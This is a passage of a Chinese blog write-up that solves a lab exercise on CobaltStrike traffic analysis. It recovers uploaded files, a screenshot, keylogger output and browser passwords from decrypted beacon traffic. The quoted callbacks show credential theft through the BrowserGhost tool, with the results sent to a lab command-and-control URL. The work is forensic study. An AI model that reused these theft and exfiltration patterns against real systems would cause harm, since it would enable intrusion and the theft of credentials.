<h4 id="黑客下载的文件内容是什么？"><a href="#黑客下载的文件内容是什么？" class="headerlink" title="黑客下载的文件内容是什么？"></a>黑客下载的文件内容是什么？</h4><p>将脚本提到MD5为96b18bc8efd0963ad2c77d084d5c1e5d的文件找到后，修改后缀名xls打开后即可看到flag.</p>
<p><img src="./image-20250427083600348.png" alt="image-20250427083600348"></p>
<p>flag即为：<code>flag{752fe2f44306e782f0d6830faad59e0e}</code></p>
<h4 id="黑客上传的文件内容是什么？"><a href="#黑客上传的文件内容是什么？" class="headerlink" title="黑客上传的文件内容是什么？"></a>黑客上传的文件内容是什么？</h4><p>分析脚步记录发现包从47234 到49618有多个<code>COMMAND_UPLOAD</code>上传指令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Packet number: 47234</span><br><span class="line">HTTP response (for request 44798 GET)</span><br><span class="line">Length raw data: 1046672</span><br><span class="line">Timestamp: 1739362623 20250212-121703</span><br><span class="line">Data size: 1046634</span><br><span class="line">Command: 10 COMMAND_UPLOAD</span><br><span class="line"> Arguments length: 786477</span><br><span class="line"> b&#39;\x00\x00\x00)C:\\Users\\Administrator\\Desktop\\upload.png\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\</span><br><span class="line"> MD5: c3b95df4307fc99783902046a44c5d11</span><br><span class="line">Command: 67 COMMAND_UPLOAD_CONTINUE</span><br><span class="line"> Arguments length: 260141</span><br><span class="line"> b&#39;\x00\x00\x00)C:\\Users\\Administrator\\Desktop\\upload.pngC\x95k\x02\xf8\x14\xd8\x87P$\x9dKK\xeck\</span><br><span class="line"> MD5: d4863d91eb3b4f9589c72fa6f512cc14</span><br><span class="line"></span><br><span class="line">Packet number: 47234</span><br><span class="line">HTTP request </span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;en_US&#x2F;all.js</span><br><span class="line">Length raw data: 1046672</span><br><span class="line">HMAC signature invalid</span><br><span class="line"></span><br><span class="line">Packet number: 49618</span><br><span class="line">HTTP response (for request 47317 GET)</span><br><span class="line">Length raw data: 1040624</span><br><span class="line">Timestamp: 1739362624 20250212-121704</span><br><span class="line">Data size: 1040596</span><br><span class="line">Command: 67 COMMAND_UPLOAD_CONTINUE</span><br><span class="line"> Arguments length: 260141</span><br><span class="line"> b&#39;\x00\x00\x00)C:\\Users\\Administrator\\Desktop\\upload.png.\xd8\xd8Hzw^\xee~\x00\xf8,\x81\xa3\xd0\</span><br><span class="line"> MD5: 308acb7dad1be9f4536f0592e07a2795</span><br><span class="line">Command: 67 COMMAND_UPLOAD_CONTINUE</span><br><span class="line"> Arguments length: 260141</span><br><span class="line"> b&#39;\x00\x00\x00)C:\\Users\\Administrator\\Desktop\\upload.pngj\&#39;\xd5&quot;\x06\xb8\xe5\x9aEH\xc5\x048\xa3&#x3D;</span><br><span class="line"> MD5: faa7604d4648c0eaba56c49fe126a80d</span><br><span class="line">Command: 67 COMMAND_UPLOAD_CONTINUE</span><br><span class="line"> Arguments length: 260141</span><br><span class="line"> b&#39;\x00\x00\x00)C:\\Users\\Administrator\\Desktop\\upload.png\xaf\x9f&#96;\xbb\xc0\xc5\xc8\xd0Wq&amp;2AR\x1cW</span><br><span class="line"> MD5: 06666fffd233f1ab7a642e06b6fe5928</span><br><span class="line">Command: 67 COMMAND_UPLOAD_CONTINUE</span><br><span class="line"> Arguments length: 260141</span><br><span class="line"> b&#39;\x00\x00\x00)C:\\Users\\Administrator\\Desktop\\upload.pngC\xd8@\xca.7\x00Y&#125;z\xcf\xbc\xd4l\x1f\xd3</span><br><span class="line"> MD5: b163a6b1d558fa5653b2c70084c20cd7</span><br></pre></td></tr></table></figure>

<p>将提起出来的文件按照如下md5点顺序进行拼接：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">MD5: payload-c3b95df4307fc99783902046a44c5d11</span><br><span class="line"></span><br><span class="line">MD5: d4863d91eb3b4f9589c72fa6f512cc14</span><br><span class="line"></span><br><span class="line">MD5: 308acb7dad1be9f4536f0592e07a2795</span><br><span class="line"></span><br><span class="line">MD5: faa7604d4648c0eaba56c49fe126a80d</span><br><span class="line"></span><br><span class="line">MD5: 06666fffd233f1ab7a642e06b6fe5928</span><br><span class="line"></span><br><span class="line">MD5: b163a6b1d558fa5653b2c70084c20cd7</span><br><span class="line"></span><br><span class="line">MD5: 8bbebe9b0f2670cd5a5aa540a9a704b9</span><br></pre></td></tr></table></figure>

<p>即可得到攻击者上传的图片：</p>
<p><img src="./image-20250427084502410.png" alt="image-20250427084502410"></p>
<h4 id="黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）"><a href="#黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）" class="headerlink" title="黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）"></a>黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）</h4><p>分析流量包发现，第65334号包恰好为CALLBACK_SCREENSHOT包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Packet number: 65334</span><br><span class="line">HTTP request POST</span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;submit.php?id&#x3D;1603726794</span><br><span class="line">Length raw data: 95364</span><br><span class="line">Counter: 12</span><br><span class="line">Callback: 3 CALLBACK_SCREENSHOT</span><br><span class="line"> Length: 95315</span><br><span class="line"> MD5: 0eba599a0abd2c4c4aefe5e183312834</span><br></pre></td></tr></table></figure>

<p>读取第65334号提取出来的文件，改为png格式后，发现为chrome浏览器。</p>
<p><img src="./image-20250427212335301.png" alt="image-20250427212335301"></p>
<p>所以flag为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;chrome&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客读取到浏览器保存的密码是什么？"><a href="#黑客读取到浏览器保存的密码是什么？" class="headerlink" title="黑客读取到浏览器保存的密码是什么？"></a>黑客读取到浏览器保存的密码是什么？</h4><p>在第 123336包里读取到密码<code>0f338a1a6ad8785cee2b471d9d3e9f91</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Packet number: 123336</span><br><span class="line">HTTP request POST</span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;submit.php?id&#x3D;1603726794</span><br><span class="line">Length raw data: 868</span><br><span class="line">Counter: 16</span><br><span class="line">Callback: 0 CALLBACK_OUTPUT</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br><span class="line">b&#39;[+] [2068] [explorer] [Administrator]\r\n[+] Impersonate user Administrator\r\n[+] Current user Administrator\r\n[+] Copy C:\\Users\\Administrator\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data to C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmpF37D.tmp\r\nSystem.Security.Cryptography.CryptographicException: BCrypt.BCryptDecrypt(): authentication tag mismatch\r\n   \xd4\xda BrowserGhost.AesGcm.Decrypt(Byte[] key, Byte[] iv, Byte[] aad, Byte[] cipherText, Byte[] authTag)\r\n   \xd4\xda BrowserGhost.Program.DecryptWithKey(Byte[] encryptedData, Byte[] MasterKey)\r\n\tURL -&gt; https:&#x2F;&#x2F;www.baidu.com&#x2F;\n\tUSERNAME -&gt; xuanji\n\tPASSWORD -&gt; \n\r\n\tURL -&gt; https:&#x2F;&#x2F;baidu.com&#x2F;\n\tUSERNAME -&gt; xuanji\n\tPASSWORD -&gt; 0f338a1a6ad8785cee2b471d9d3e9f91\n\r\n[+] Delete File C:\\Users\\Administrator\\AppData\\Local\\Temp\\tmpF37D.tmp\r\n[+] Recvtoself\r\n[+] Current user Administrator\r\n&#39;</span><br><span class="line">----------------------------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>故flag为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;0f338a1a6ad8785cee2b471d9d3e9f91&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）"><a href="#黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）" class="headerlink" title="黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）"></a>黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）</h4><p>在第127593包里，我们可以看到<code>xj.edisec.net</code>推测访问了这个网址。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Packet number: 127593</span><br><span class="line">HTTP request POST</span><br><span class="line">http:&#x2F;&#x2F;192.168.31.170&#x2F;submit.php?id&#x3D;1603726794</span><br><span class="line">Length raw data: 244</span><br><span class="line">Counter: 17</span><br><span class="line">Callback: 1 CALLBACK_KEYSTROKES</span><br><span class="line">b&#39;\x8c\x00\x00\x00\n\n\x03C\xd0\xc2\xb1\xea\xc7\xa9\xd2\xb3 - Google Chrome\n\x03E&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\x0f\nxj.edisec.net\n\n\n\x03Cxj.edisec.net&#x2F;signin?redirect&#x3D;%2F - Google Chrome\n\x03E&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;\x0f\n\x032[control]\x0f\x032[ctrl]\x0f\x01\x00\x00\x00%\x00\x00\x00\xb5\xc7\xc2\xbd \xa1\xa4 \xd0\xfe\xbb\xfa - EDISEC - Google Chrome\r\x00\x00\x00Administrator&#39;</span><br></pre></td></tr></table></figure>

<p>flag为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;xj.edisec.net&#125;</span><br></pre></td></tr></table></figure>
















      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">基于玄机靶场CobaltStrike流量分析题目的学习笔记</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">lexsd6</a></p>
        <p><span>发布时间:</span>2025-04-27, 22:23:12</p>
        <p><span>最后更新:</span>2025-04-27, 22:27:50</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/" title="基于玄机靶场CobaltStrike流量分析题目的学习笔记">lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/</a>
            <span class="copy-path" data-clipboard-text="原文: lexsd6.github.io/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/　　作者: lexsd6" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2025/06/19/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%20tomcat/">
                    第六章-流量特征分析-常见攻击事件-tomcat-玄机靶场
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2025/04/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7-%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%E6%BA%AF%E6%BA%90-wp/">
                    第五届红明谷-异常行为溯源-WP
                </a>
            </div>
        
    </nav>



  

  <!-- code.copy.start -->
	 <!-- 
<script src="/js/clipboard.js"></script>
  -->
	 <!-- 
<script src="/js/jquery.min.js"></script>
 -->
	 <!-- 
<script src="/js/clipboard_use.js"></script>
 -->
	<script type="text/javascript" src="/js/clipboard.js"></script>
 	<script type="text/javascript" src="/js/jquery.min.js"></script>
	<script type="text/javascript" src="/js/clipboard_use.js"></script>

    <!-- code.copy.end -->
</article>


    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CobaltStrike运行过程浅说"><span class="toc-text">CobaltStrike运行过程浅说</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CobaltStrike-流量分析破解思路"><span class="toc-text">CobaltStrike 流量分析破解思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RSA-私钥获取"><span class="toc-text">RSA 私钥获取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#未获取-cobaltstrike-beacon-keys的情况（n可以分解）"><span class="toc-text">未获取.cobaltstrike.beacon_keys的情况（n可以分解）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#加密的元数据获取"><span class="toc-text">加密的元数据获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#raw-key获取"><span class="toc-text">raw key获取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#流量包解密"><span class="toc-text">流量包解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CobaltStrike流量分析-解题记录"><span class="toc-text">CobaltStrike流量分析-解题记录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#溯源反制"><span class="toc-text">溯源反制</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客攻击的上线时间"><span class="toc-text">黑客攻击的上线时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客使用的隧道payload名字是什么？"><span class="toc-text">黑客使用的隧道payload名字是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客获取到当前用户的明文密码是什么？"><span class="toc-text">黑客获取到当前用户的明文密码是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客为了得到明文密码修改了什么？（提交flag-md5-执行的命令-）"><span class="toc-text">黑客为了得到明文密码修改了什么？（提交flag{md5(执行的命令)}）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客下载的文件名称是什么？"><span class="toc-text">黑客下载的文件名称是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客下载的文件内容是什么？"><span class="toc-text">黑客下载的文件内容是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客上传的文件内容是什么？"><span class="toc-text">黑客上传的文件内容是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）"><span class="toc-text">黑客截图后获取到用户正在使用哪个软件？（提交程序名称如firefox）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客读取到浏览器保存的密码是什么？"><span class="toc-text">黑客读取到浏览器保存的密码是什么？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）"><span class="toc-text">黑客使用键盘记录获取到用户打开了什么网站？（提交网站域名）</span></a></li></ol></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-4 i,
        .toc-level-4 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"基于玄机靶场CobaltStrike流量分析题目的学习笔记　| lexsd6's home　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
      <section class="livere" id="comments">
    <!-- 来必力City版安装代码 -->
    <div id="lv-container" data-id="city" data-uid="MTAyMC81NDYyMC8zMTA5MQ==">
    <script type="text/javascript">
   (function(d, s) {
       var j, e = d.getElementsByTagName(s)[0];
	
       if (typeof LivereTower === 'function') { return; }

       j = d.createElement(s);
       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
       j.async = true;

       e.parentNode.insertBefore(j, e);
	
       })(document, 'script');
	
    </script>
    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>

	</div>

    <!-- City版安装代码已完成 -->
<script type="text/javascript">
    
setInterval(function () {
    var box = document.querySelector(".trc_rbox_container");
    if(box) box.outerHTML = "";
}, 2000);
document.getElementById("taboola-livere").style='display:none';
</script>
</section>
    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2025/06/19/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%20tomcat/" title="上一篇: 第六章-流量特征分析-常见攻击事件-tomcat-玄机靶场">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2025/04/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7-%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%E6%BA%AF%E6%BA%90-wp/" title="下一篇: 第五届红明谷-异常行为溯源-WP">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2025/06/19/%E7%AC%AC%E5%85%AD%E7%AB%A0%20%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%20tomcat/">第六章-流量特征分析-常见攻击事件-tomcat-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/27/CobaltStrike%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">基于玄机靶场CobaltStrike流量分析题目的学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/04/06/%E7%AC%AC%E4%BA%94%E5%B1%8A%E7%BA%A2%E6%98%8E%E8%B0%B7-%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%E6%BA%AF%E6%BA%90-wp/">第五届红明谷-异常行为溯源-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2025/02/28/%E6%9F%90%E5%8F%98%E5%BC%82Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">某变异Webshell流量分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/12/27/House%20of%20apple2%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">House of apple2 学习笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-mysql-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第二章日志分析-mysql-应急响应-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/">第三章 权限维持-linux权限维持-隐藏-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第二章日志分析-redis应急响应-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第一章-应急响应-Linux入侵排查-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-webshell%E6%9F%A5%E6%9D%80-%E7%8E%84%E6%9C%BA%E9%9D%B6%E5%9C%BA/">第一章-应急响应-webshell查杀-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%B8%80%E7%AB%A0/">第一章-应急响应-Linux 日志分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/07/10/%E7%AC%AC%E4%BA%8C%E7%AB%A0-/">第二章-日志分析-apache日志分析-玄机靶场</a></li><li class="post-list-item"><a class="post-list-link" href="/2024/02/15/%E4%BB%8EHTB%20_Arms_roped%E5%88%9D%E8%AF%86arm%E6%9E%B6%E6%9E%84/">从HTB _Arms_roped初识arm架构和qemu</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/10/07/Python2%20%E7%8E%AF%E5%A2%83%E5%9C%A8ubuntu22.04%20%E9%85%8D%E7%BD%AE/">在ubuntu22.04配置Python2环境</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/09/22/msql%E6%95%B0%E6%8D%AE%E5%BA%93-udf-%E6%8F%90%E6%9D%83%E5%A7%BF%E5%8A%BF%E5%AD%A6%E4%B9%A0/">msql数据库-udf-提权姿势学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/04/20/python-sandbox%20bypass%20'()'%20to%20%20runing%20function/">Python-sandbox bypass '(' and ')' to  calling function</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/29/ELF%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90--Program%20header/">ELF文件解析--Program header</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/01/07/ELF%E6%96%87%E4%BB%B6%E5%A4%B4%E8%A7%A3%E6%9E%90%E5%AD%A6%E4%B9%A0/">ELF文件解析--ELF header 分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/16/decrypt_safe_linking/">how2heap-decrypt_safe_linking学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/10/02/2022%E5%B7%9D%E6%B8%9D%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B--hard_login/">2022川渝职业技能竞赛初赛--hard_login</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/09/14/%E5%B7%9D%E6%B8%9D%E4%B8%AA%E4%BA%BA%E8%B5%9B-wp/">2022川渝个人赛-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/07/26/%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/">搜索引擎语法学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/17/how2heap-fastbin_reverse_into_tcache-%E5%AD%A6%E4%B9%A0/">how2heap-fastbin_reverse_into_tcache-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/06/15/how2heap-house_of_botcake-%E5%AD%A6%E4%B9%A0/">how2heap-house_of_botcake-学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/05/16/%E5%9C%A8unity%E4%B8%AD%E4%BD%BF%E7%94%A8DragonBones%E9%AA%A8%E9%AA%BC/">在unity中使用DragonBones骨骼的方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/07/RITSEC-CTF-2022%20-PWN-hangpwn/">RITSEC-CTF-2022-PWN-hangpwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/04/03/HTB-Login%20Simulator-pwn-challenge-wp/">HTB-Login Simulator-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-baby_ninja_jinja-web-challenge-wp/">HTB-baby_ninja_jinja-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/26/HTB-Neonify-web-challenge-wp/">HTB-Neonify-web-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/03/08/HTB-Pandora-wp/">HTB-Pandora-Machine-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2022/02/22/HSC2021-CTF/">HSC2021-CTF-pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/31/sctf2021-pwn-dataleak/">sctf2021-pwn-dataleak-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/04/%E4%B8%9C%E8%BD%AF/">东软2021CTF--PWN--wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/12/03/cosy-casino-pwn-challenge-wp/">HTB-cosy_casino-pwn-challenge-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/27/2021%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B%E7%A7%8B%E5%AD%A3%E8%B5%9B%E5%8B%87%E8%80%85%E5%B1%B1%E5%B3%B0/">2021年春秋杯网络安全联赛秋季赛勇者山峰-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/07/Largebin%20Attack%20for%20Glibc%202.31%20%E5%AD%A6%E4%B9%A0/">Large bin Attack for Glibc 2.31 学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/03/%E8%A7%A3%E5%86%B3yelee%E6%A8%A1%E6%9D%BF%E4%B8%8Blive2d%E7%9C%8B%E6%9D%BF%E5%A8%98%E5%92%8Cbusuanzi%E4%B8%8D%E8%92%9C%E5%AD%90%E8%AE%A1%E6%95%B0%E5%86%B2%E7%AA%81/">解决yelee模板下live2d看板娘和busuanzi不蒜子计数冲突</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/11/02/PWN%20Hunting%20challenge%20%E2%80%94%20HTB/">Hunting— HTB  PWN  challenge</a></li><li class="post-list-item"><a class="post-list-link" 